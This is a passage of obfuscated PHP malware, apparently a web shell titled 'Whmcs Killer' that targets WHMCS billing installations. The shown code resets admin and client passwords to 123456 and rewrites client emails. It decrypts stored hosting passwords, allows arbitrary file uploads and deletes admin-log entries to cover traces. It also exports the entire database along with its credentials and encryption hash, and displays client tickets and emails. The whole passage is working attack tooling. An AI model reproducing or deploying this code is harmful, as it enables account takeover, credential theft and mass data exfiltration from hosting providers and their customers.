><h1>Admin ID:</h1><input type=\"text" name="idd" value="1"><input type=\"Submit" name=\"Submit" value="Submit"><input type=\"hidden\" name=\"f\" value="cpa\"></form>";echo"<hr><center><h1>Change Client Password to 123456</h1><br><form method=\"POST\" action=\"?p=8" ><h1>Mail:</h1><input type="text" name="mail" value="client@mail.com
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */\"><input type="Submit" name=\"Submit\" value="Submit"><input type="hidden" name=\"f" value=\"cpc\"></form>";echo"<hr><center><h1>Change Client Mail</h1><br><form method=\"POST" action=\"?p=8" ><h1>Client ID:</h1><input type="text\" name="id" value=\"\"><h1>Client Mail:</h1><input type=\"text" name=\"mail\" value=\""><input type="Submit\" name="Submit\" value="Submit"><input type="hidden" name=\"f" value="ccm\"></form>";if($_POST["f"]=="dec"){$smjvmye="cc_encryption_hash";${${"GLOBALS"}["tmfxusug"]}=($_POST["password"]);${$smjvmye}=($_POST["cc_encryption_hash"]);${"GLOBALS"}["yknmcpzs"]="password";$ljsurxln="password";${${"GLOBALS"}["yknmcpzs"]}=decrypt(${${"GLOBALS"}["tmfxusug"]},${${"GLOBALS"}["datzsblhzhf"]});echo("<h1>Password is ".${$ljsurxln}."</h1>");}echo("<hr>
<h1> Decrypt Password</h1>
<FORM action=\"?p=8\"  method=\"post">
<input type=\"hidden\" name="f" value="dec">
<br>
<table border=1>

<tr><td>Password</td><td><input type="text\" size="30\" name=\"password" value=\"\"></td></tr>
<tr><td>cc_encryption_hash</td><td><input type="text\" size="30\" name=\"cc_encryption_hash\" value=\""></td></tr>

</table>
<br>
<INPUT class=submit type=\"submit" value="Submit\" name="Submit">
</FORM>
<hr>");if($_POST["f"]=="upload"){${${"GLOBALS"}["lbwunffup"]}="";${${"GLOBALS"}["zcnueceb"]}="2000000000";$vjbqxlshnmyo="userfile_tmp";$userfile_name=$_FILES["image"]["name"];${$vjbqxlshnmyo}=$_FILES["image"]["tmp_name"];if(isset($_FILES["image"]["name"])){$kflbih="filedir";$edcedwuf="abod";$komgigvk="abod";${$komgigvk}=${$kflbih}.$userfile_name;@move_uploaded_file(${${"GLOBALS"}["jeodtgliqnwo"]},${$edcedwuf});echo"<h3><center><b>Done ==> $userfile_name</b></h3></center>";}}if($_POST["f"]=="ip"){$jyotliutht="tryChaning";${${"GLOBALS"}["aoxjiv"]}=mysql_query("DELETE FROM tbladminlog where ipaddress='".$_POST["ip"]."'")or die("Erreur SQL !".${${"GLOBALS"}["hheigfnepd"]}."<br>".mysql_error());if(${$jyotliutht}){echo("<h3><br>Last adminlog successfully deleted</h3>");}else{echo("<h3><br>Deleteing adminlog error</h3>");}}if($_POST["f"]=="cpa"){$rggvfbged="tryChaningInfo";$cujjkx="tryChaningInfo";${$rggvfbged}=mysql_query("UPDATE tbladmins SET password = 'e10adc3949ba59abbe56e057f20f883e' where id='".$_POST["idd"]."'")or die("Erreur SQL !".${${"GLOBALS"}["hheigfnepd"]}."<br>".mysql_error());if(${$cujjkx}){echo("<h3><br>[+] Changing admin password to 123456");}else{echo("<h3><br>[-] Changing admin password error");exit;}}if($_POST["f"]=="cpc"){$hsvxwrdxgp="tryChaningInfo";${${"GLOBALS"}["bbxvsr"]}=mysql_query("UPDATE tblclients SET password = '760d0530440ec45a2c3dc8b38dee8e9a:%ME)v' where email='".$_POST["mail"]."'");if(${$hsvxwrdxgp}){echo("<h3><br>[+] Changing client ".$_POST["mail"]." password to 123456");}else{echo("<h3><br>[-] Changing client password error");exit;}}if($_POST["f"]=="ccm"){$nmrbxwk="tryChaningInfo";${${"GLOBALS"}["bbxvsr"]}=mysql_query("UPDATE tblclients SET email = '".$_POST["mail"]."' where id='".$_POST["id"]."'");if(${$nmrbxwk}){echo("<h3><br>[+] Changing client ".$_POST["id"]." mail to ".$_POST["mail"]."");}else{echo("<h3><br>[-] Changing client password error");exit;}}break;case 9:foreach($_COOKIE as${${"GLOBALS"}["gkdriputxvs"]}=>${${"GLOBALS"}["wpsqjhhkp"]}){setcookie(${${"GLOBALS"}["gkdriputxvs"]},"");}echo("     <meta http-equiv='refresh' content='1;URL=?' />");break;default:if($_COOKIE["login"]=="1"){echo("<title>Whmcs Killer Coded by RAB3OUN</title><FRAMESET cols=\"200,*">
<FRAME name="sommaire" target=\"frame1" src=\"?p=m\" scrolling="auto\">
<FRAME name="frame1\" src="?p=1" scrolling=\"auto\">
</FRAMESET>
<NOFRAMES> <P>Cette page utilise des cadres, mais votre navigateur ne les prend pas en charge.</p> </NOFRAMES>");}else{echo(${${"GLOBALS"}["ytcwncufygm"]});login();}break;case 11:${$ihbmai}=mysql_connect(${${"GLOBALS"}["mteueri"]},${${"GLOBALS"}["ocnhbeecmfr"]},${${"GLOBALS"}["qkmhvrcw"]});mysql_select_db(${${"GLOBALS"}["helarbxk"]},${${"GLOBALS"}["vbpmgiycm"]});${${"GLOBALS"}["hypytl"]}=$_POST["action"];if(${${"GLOBALS"}["mjjavslk"]}=="yes"){error_reporting(E_ALL^E_NOTICE);${"GLOBALS"}["krkelljh"]="db_username";$zocmeqyl="tables";@ini_set("memory_limit",32*1024*1024);$gmsocvoc="db_password";@ini_set("max_execution_time","480");${${"GLOBALS"}["oopdhffk"]}=$_POST["tablen"];foreach(${$zocmeqyl} as${${"GLOBALS"}["ngjywjqkzjlf"]}){$onpccpxcjq="query";$vzpkugan="query";${"GLOBALS"}["znuleub"]="table";${$onpccpxcjq}=@mysql_query("SHOW CREATE TABLE ".${${"GLOBALS"}["znuleub"]});${"GLOBALS"}["mirzpkxlpws"]="que";$uickigscpbnz="query";$ejxqpvowu="num_fields";${${"GLOBALS"}["remcsasob"]}=@mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]});${${"GLOBALS"}["pqbrvumqoucu"]}.=${${"GLOBALS"}["mirzpkxlpws"]}["Create Table"].";
";${"GLOBALS"}["qebtlxbqmam"]="outta";${${"GLOBALS"}["qebtlxbqmam"]}.="
";${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("select * from ".${${"GLOBALS"}["ngjywjqkzjlf"]});${$ejxqpvowu}=mysql_num_fields(${$uickigscpbnz});${${"GLOBALS"}["efclwulosb"]}=mysql_num_rows(${$vzpkugan});while(${${"GLOBALS"}["tnpgxkuqfmi"]}=mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]})){$slmldxx="table";${${"GLOBALS"}["pqbrvumqoucu"]}.="INSERT INTO ".${$slmldxx}." VALUES(";$otbqwdovvv="j";${"GLOBALS"}["paufdon"]="j";$kiocpatmot="outta";${"GLOBALS"}["nbaovctg"]="j";for(${$otbqwdovvv}=0;${${"GLOBALS"}["paufdon"]}<${${"GLOBALS"}["vmgpud"]};${${"GLOBALS"}["nbaovctg"]}++){${"GLOBALS"}["ojwxvfukj"]="j";${"GLOBALS"}["zjjvtxtyskb"]="j";${"GLOBALS"}["umhbuivymjw"]="row";${"GLOBALS"}["oisbntjh"]="row";${"GLOBALS"}["yrsleip"]="row";${"GLOBALS"}["qotlrtzbc"]="row";${"GLOBALS"}["etjvphmqo"]="j";${"GLOBALS"}["idhxwuypes"]="row";${${"GLOBALS"}["umhbuivymjw"]}[${${"GLOBALS"}["zjjvtxtyskb"]}]=addslashes(${${"GLOBALS"}["yrsleip"]}[${${"GLOBALS"}["ojwxvfukj"]}]);${"GLOBALS"}["dmurladbvb"]="outta";${"GLOBALS"}["lnouautj"]="row";${${"GLOBALS"}["idhxwuypes"]}[${${"GLOBALS"}["uoocmhnsd"]}]=str_replace("
","
",${${"GLOBALS"}["qotlrtzbc"]}[${${"GLOBALS"}["uoocmhnsd"]}]);${"GLOBALS"}["gdkfdnd"]="j";${${"GLOBALS"}["lnouautj"]}[${${"GLOBALS"}["uoocmhnsd"]}]=str_replace("
","",${${"GLOBALS"}["tnpgxkuqfmi"]}[${${"GLOBALS"}["etjvphmqo"]}]);if(isset(${${"GLOBALS"}["oisbntjh"]}[${${"GLOBALS"}["uoocmhnsd"]}]))${${"GLOBALS"}["dmurladbvb"]}.="'$row[$j]'";else${${"GLOBALS"}["pqbrvumqoucu"]}.="\""";if(${${"GLOBALS"}["gdkfdnd"]}<(${${"GLOBALS"}["vmgpud"]}-1))${${"GLOBALS"}["pqbrvumqoucu"]}.=", ";}${$kiocpatmot}.=");
";}${${"GLOBALS"}["pqbrvumqoucu"]}.="
";}${"GLOBALS"}["vrhzemxpyci"]="outta";${"GLOBALS"}["rgvihwhbfu"]="date";${"GLOBALS"}["pifbdbampdc"]="outta";${${"GLOBALS"}["rgvihwhbfu"]}=time();@ob_end_clean();header("Content-length: ".strlen("-- --------WHMCS BACKUP ----------------
	-- host:".${${"GLOBALS"}["niecnejwfmy"]}."
	-- username:".${${"GLOBALS"}["krkelljh"]}."
	-- password:".${$gmsocvoc}."
	-- cc_hash:".$_COOKIE["cc_encryption_hash"]."
-- ------------------------------
".${${"GLOBALS"}["vrhzemxpyci"]}));header("Content-type: text/plain");header("Content-Disposition: attachment; filename=".$_SERVER["HTTP_HOST"]."-$date.sql");echo"-- --------WHMCS BACKUP ----------------
	-- host:".${${"GLOBALS"}["niecnejwfmy"]}."
	-- username:".${${"GLOBALS"}["cxojuijvhke"]}."
	-- password:".${${"GLOBALS"}["qkmhvrcw"]}."
	-- cc_hash:".$_COOKIE["cc_encryption_hash"]."
-- ------------------------------
".${${"GLOBALS"}["pifbdbampdc"]};}echo"<script language=\"JavaScript\">

function checkAll(form){

  for (var i = 0; i < form.elements.length; i++){

    eval(\"form.elements[\" + i + \"].checked = form.elements[0].checked\");

  }

}

</script>";${${"GLOBALS"}["oopdhffk"]}=@mysql_query("SHOW TABLE STATUS");echo"<form name="formw\" method="post\">

<input name=\"action\" type=\"hidden" value=\"yes\">

<table width=\"280\" border="1\" align="center" cellpadding=\"4" cellspacing="0" >

    <tr>

      <td align="center\" height=\"28\" width="35\"><input name="tableall" type="checkbox" checked="checked\" onClick=\"checkAll(this.form)\"/></td>

      <td align="center\" width="130\">Tabel Name</td>

      <td width=\"100"><div align=\"center\">Size</div></td>

    </tr>";while(${${"GLOBALS"}["ngjywjqkzjlf"]}=@mysql_fetch_array(${${"GLOBALS"}["iythzoxdsfo"]})){${${"GLOBALS"}["dlsibicfnkg"]}=round(${${"GLOBALS"}["ngjywjqkzjlf"]}["Data_length"]/1024,2);echo" <tr><td>";echo"<input type=\"checkbox" name=\"tablen[]" value="$table[Name]\" checked="checked" />";echo"</td>

      <td><b>";${"GLOBALS"}["dxyntpihcw"]="size";echo${${"GLOBALS"}["ngjywjqkzjlf"]}[Name];echo"</b></td>

      <td><div align=\"center\"> kb <b>";echo${${"GLOBALS"}["dxyntpihcw"]};echo"</b></div></td>

    </tr>";}echo"
</table> <br>

<center><input type=\"submit\" name="submit2\" class="buttons\" value=\"[download backup ]\" /></center>

</form>";break;case 12:if($_GET["m"]){$ybuhhryyf="v";${${"GLOBALS"}["iahgcggxrfyj"]}=mysql_query("SELECT * FROM tblemails where id='".$_GET["m"]."'");${"GLOBALS"}["zshhnaron"]="query1";${${"GLOBALS"}["sqgchrxwl"]}=mysql_fetch_array(${${"GLOBALS"}["zshhnaron"]},true);echo(${$ybuhhryyf}["subject"]);echo("<br>");echo(${${"GLOBALS"}["sqgchrxwl"]}["message"]);exit;}echo("<pre>");${${"GLOBALS"}["bbbwyjm"]}=mysql_query("SELECT * FROM tblclients where id='".$_GET["id"]."'");while(${${"GLOBALS"}["sqgchrxwl"]}=mysql_fetch_array(${${"GLOBALS"}["iahgcggxrfyj"]},true)){print_r(${${"GLOBALS"}["sqgchrxwl"]});}echo("</pre>");${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tbltickets where userid='".$_GET["id"]."'");while(${${"GLOBALS"}["nbskojmpbuf"]}=mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]})){${"GLOBALS"}["usadrhsnw"]="v2";${"GLOBALS"}["xmsrolc"]="v";$otimxonuk="v";echo("<br><br><center><table border=1>");echo("<tr><td>".${${"GLOBALS"}["xmsrolc"]}["title"]."<br>".${$otimxonuk}["date"]."</td></tr>");$vobpdcslh="v";echo("<tr><td>".(${${"GLOBALS"}["sqgchrxwl"]}["message"])."</td></tr>");${${"GLOBALS"}["weufxkdwhjrs"]}=mysql_query("select * from tblticketreplies where tid='".${$vobpdcslh}["id"]."'");while(${${"GLOBALS"}["usadrhsnw"]}=mysql_fetch_array(${${"GLOBALS"}["weufxkdwhjrs"]})){$fbfxhedwamcx="v2";echo("<tr><td>".(${$fbfxhedwamcx}["message"])."</td></tr>");}echo("</table><br><br>");}${${"GLOBALS"}["kqkvclxesp"]}=mysql_query("SELECT * FROM tblhosting  where userid='".$_GET["id"]."'");while(${${"GLOBALS"}["nlybchj"]}=mysql_fetch_array(${$civmqlvwy})){$sfpmjxwgs="cc_encryption_hash";${"GLOBALS"}["tojungu"]="v";${${"GLOBALS"}["tmfxusug"]}=decrypt(${${"GLOBALS"}["tojungu"]}["password"],${$sfpmjxwgs});if(${${"GLOBALS"}["sqgchrxwl"]}["username"]){${"GLOBALS"}["rxdkwscyogh"]="v";$fksxkjdz="v";echo("<br><table border='0'>");${"GLOBALS"}["xvmkdaf"]="v";echo("<tr><td>Domain</td><td>".${$fksxkjdz}["domain"]."</td></tr>");echo("<tr><td>Username</td><td>".${${"GLOBALS"}["rxdkwscyogh"]}["username"]."</td></tr>");echo("<tr><td>Password</td><td>$password</td></tr>");echo("<tr><td>Notes</td><td>".nl2br(${${"GLOBALS"}["xvmkdaf"]}["notes"])."</td></tr>");echo"</table></center>";}}echo("<h1>Client mails</h1><br><br>");${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblemails  where userid='".$_GET["id"]."'");echo("<table><tr><td>Subject</td><td>Date</td></tr>");while(${$sbesjbau}=mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]})){$ypwwwsesk="v";echo("<tr><td><a href='?p=12&id=".$_GET["id"]."&m=".${${"GLOBALS"}["sqgchrxwl"]}["id"]."'>".${$ypwwwsesk}["subject"]."</a></td><td>".${${"GLOBALS"}["sqgchrxwl"]}["date"]."</td></tr>");}echo("</table>");break;}echo "


";
?>
{% endhighlight %}
